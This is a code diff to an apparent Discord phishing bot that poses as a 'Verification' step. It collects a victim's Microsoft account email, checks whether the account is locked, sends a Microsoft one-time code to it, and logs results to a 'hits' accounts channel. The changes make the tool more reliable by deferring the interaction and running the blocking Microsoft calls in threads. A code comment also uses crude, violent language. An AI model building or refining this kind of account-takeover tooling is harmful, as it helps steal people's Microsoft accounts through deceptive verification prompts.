@@ -31,15 +31,17 @@ class MyModalOne(ui.Modal, title="Verification"):
             )
             return
 
+        await interaction.response.defer()
+
         logs_channel = await interaction.client.fetch_channel(config["discord"]["logs_channel"])
         hits_channel = await interaction.client.fetch_channel(config["discord"]["accounts_channel"])
 
         # Checks if the account is locked
         # Special thanks to Revive (kpriest95523) for this request
-        lockedInfo = checkLocked(self.email.value)
+        lockedInfo = await asyncio.to_thread(checkLocked, self.email.value)
 
         if "Value" not in lockedInfo or json.loads(lockedInfo["Value"])["status"]["isAccountSuspended"]:
-            await interaction.response.send_message(
+            await interaction.followup.send(
                 "❌ This microsoft account is locked, as so we cannot verify it. Try again with another account.",
                 ephemeral = True
             )
@@ -55,10 +57,8 @@ class MyModalOne(ui.Modal, title="Verification"):
             
             return
 
-        await interaction.response.defer()
-
         # Sends OTP/Auth code
-        emailInfo = sendAuth(self.email.value)
+        emailInfo = await asyncio.to_thread(sendAuth, self.email.value)
 
         # Microsoft raping otp requests
         # Can be fixed since the latest otp sent still works
@@ -71,7 +71,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                 )
             )
 
-            await interaction.response.send_message(
+            await interaction.followup.send(
                     embed = Embed(
                     title = embeds["cooldown_otp"][0],
                     description = embeds["cooldown_otp"][1],
@@ -90,7 +90,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                     )
                 )
 
-            await interaction.response.send_message(
+            await interaction.followup.send(
                 embed = Embed(
                     title = embeds["failed_otp"][0],
                     description = embeds["failed_otp"][1],
